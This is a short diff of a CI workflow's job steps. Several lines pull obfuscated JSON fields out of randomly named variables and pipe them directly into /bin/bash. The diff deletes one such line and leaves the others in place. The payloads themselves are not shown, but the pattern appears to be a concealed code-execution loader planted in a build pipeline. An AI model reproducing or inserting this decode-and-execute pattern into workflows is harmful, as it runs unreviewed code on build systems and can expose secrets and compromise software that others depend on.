@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$h9" | jq -r .mocte8986 | /bin/bash
           echo $lm0361 | jq -r .x4705 | /bin/bash
           printf '%s' "$oqdi82" | jq -r .xn83956 | /bin/bash
-          echo $vgk964 | jq -r .l99 | /bin/bash
           printf '%s' "$usrs0251" | jq -r .mhwrd518 | /bin/bash
 
       - name: Save archive
